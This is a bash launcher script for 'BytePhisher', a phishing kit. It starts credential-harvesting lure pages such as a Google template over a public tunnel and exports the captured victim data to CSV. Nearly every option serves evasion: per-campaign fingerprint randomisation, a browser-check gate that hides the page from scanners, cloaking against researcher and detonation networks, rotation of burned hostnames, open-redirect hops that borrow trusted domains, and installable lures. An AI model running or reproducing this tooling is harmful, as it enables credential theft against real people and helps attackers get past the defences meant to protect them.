#!/usr/bin/env bash
# BytePhisher one-command campaign.
#
#   bash tools/campaign.sh [template] [campaign-name] [tunneler]
#   bash tools/campaign.sh google q3-payroll cloudflared
#
# What it does:
#   1. preflight  — runs the doctor; refuses to start if a blocking check fails
#   2. run        — starts the server + tunnel with a campaign tag,
#                   a live dashboard
#   3. on exit    — exports data/captures-<campaign>.csv from the capture store
#
# Ctrl+C stops the campaign; the export is written from whatever was captured.
set -uo pipefail

TEMPLATE="${1:-google}"
CAMPAIGN="${2:-campaign-$(date +%Y%m%d-%H%M)}"
TUNNELER="${3:-cloudflared}"

cd "$(dirname "$0")/.." || exit 1

# interpreter: $PYTHON, then a local venv, then python3 on PATH (CI has no venv)
PY="${PYTHON:-}"
if [ -z "$PY" ]; then
  if [ -x "./.venv/bin/python" ]; then PY="./.venv/bin/python"
  elif command -v python3 >/dev/null 2>&1; then PY="python3"
  else echo "[campaign] no python interpreter found (set PYTHON=...)" >&2; exit 1
  fi
fi
# a bare name ("python3") is not a path, so -x is false for it: check that the
# interpreter actually runs, which is the property the script needs
"$PY" -c "import sys; sys.exit(0)" >/dev/null 2>&1 || {
  echo "[campaign] $PY does not run - run: make install" >&2; exit 1; }

CSV="data/captures-${CAMPAIGN}.csv"

echo "[campaign] preflight (bytephisher --doctor)"
if ! $PY bytephisher.py --doctor; then
  echo "[campaign] doctor reported blocking failures — not starting"
  exit 1
fi

write_outputs() {
  echo
  echo "[campaign] writing outputs for '$CAMPAIGN'"
  $PY bytephisher.py --export "$CSV" --campaign "$CAMPAIGN" 2>/dev/null || true
  echo "[campaign] csv    : $CSV"
}
trap write_outputs EXIT

echo "[campaign] starting '$TEMPLATE' as '$CAMPAIGN' over '$TUNNELER'"

# Run the CLI in the background and forward signals to it, so Ctrl+C (process
# group) and a programmatic SIGINT/SIGTERM aimed at this script both stop the
# campaign and still reach the EXIT trap that writes the export.
# Preflight: a host that cannot do the job must say so now, not halfway through the
# campaign. CAMPAIGN_SKIP_LAB=1 overrides it for a run you know about.
: "${CAMPAIGN_SKIP_LAB:=0}"
if [ "$CAMPAIGN_SKIP_LAB" != "1" ]; then
  echo "[campaign] preflight (tools/lab_check.py)"
  # `--warn-only browser`: a campaign that never runs a browser-driven task (takeover,
  # live view) does not need a browser with network, so that check warns instead of
  # blocking. Everything else still blocks.
  if ! $PY tools/lab_check.py --warn-only browser; then
    echo "[campaign] preflight says this host is not ready - fix the FAIL lines above,"
    echo "[campaign] or set CAMPAIGN_SKIP_LAB=1 to start anyway"
    exit 2
  fi
fi

# --symbols random: a fresh cookie/attribute name set per campaign, so one
# fingerprint does not cover every campaign this tool has run. Set CAMPAIGN_SYMBOLS
# to "fixed" if a runbook or tool of yours expects __bhs / data-capture.
: "${CAMPAIGN_SYMBOLS:=random}"
# --verify-first: a scanner that does not interact never receives the page at all. It costs a
# real visitor one extra "checking your browser" step, and it runs in both modes (the static
# server serves the interstitial on the first hit and the page only after a pass).
: "${CAMPAIGN_VERIFY:=1}"
VERIFY_FLAG=""
[ "$CAMPAIGN_VERIFY" = "1" ] && VERIFY_FLAG="--verify-first"

# --pwa: the lure is installable, so the icon reopens it with no new message. It needs HTTPS
# for the browser to offer the install, which a real tunneler provides.
: "${CAMPAIGN_PWA:=0}"
PWA_FLAG=""
[ "$CAMPAIGN_PWA" = "1" ] && PWA_FLAG="--pwa --pwa-name $CAMPAIGN"

# --cloak: refuse researcher networks and never serve a detonation range. The ranges are
# operator-supplied (CAMPAIGN_DETONATION_ASN / CAMPAIGN_DETONATION_CIDR) because the vendor
# networks move; a hardcoded list would be a guess.
: "${CAMPAIGN_CLOAK:=0}"
CLOAK_FLAG=""
[ "$CAMPAIGN_CLOAK" = "1" ] && CLOAK_FLAG="--cloak"
[ -n "${CAMPAIGN_DETONATION_ASN:-}" ] && CLOAK_FLAG="$CLOAK_FLAG --detonation-asn $CAMPAIGN_DETONATION_ASN"
[ -n "${CAMPAIGN_DETONATION_CIDR:-}" ] && CLOAK_FLAG="$CLOAK_FLAG --detonation-cidr $CAMPAIGN_DETONATION_CIDR"

# --pool: rotation state for the hostnames this campaign uses, so a burned one is never
# handed out twice. --hop: wrap the lure in open-redirect hops so the message carries a
# trusted domain. --heartbeat-file: a dead-man's switch, because a campaign that has stopped
# looks exactly like a campaign nobody clicked.
POOL_FLAG=""
[ -n "${CAMPAIGN_POOL:-}" ] && POOL_FLAG="--pool $CAMPAIGN_POOL"
HOP_FLAG=""
[ -n "${CAMPAIGN_HOP:-}" ] && HOP_FLAG="--hop $CAMPAIGN_HOP"
HEARTBEAT_FLAG=""
[ -n "${CAMPAIGN_HEARTBEAT:-}" ] && HEARTBEAT_FLAG="--heartbeat-file $CAMPAIGN_HEARTBEAT"
COHORTS_FLAG=""
[ -n "${CAMPAIGN_COHORTS:-}" ] && COHORTS_FLAG="--cohorts $CAMPAIGN_COHORTS"

$PY bytephisher.py -o "$TEMPLATE" -t "$TUNNELER" --campaign "$CAMPAIGN" \
    --symbols "$CAMPAIGN_SYMBOLS" $VERIFY_FLAG $PWA_FLAG $CLOAK_FLAG $POOL_FLAG \
    $HOP_FLAG $HEARTBEAT_FLAG $COHORTS_FLAG --geo ipapi &
CHILD=$!

forward() { kill -INT "$CHILD" 2>/dev/null || true; }
trap forward INT TERM

wait "$CHILD"
STATUS=$?
trap - INT TERM
exit "$STATUS"
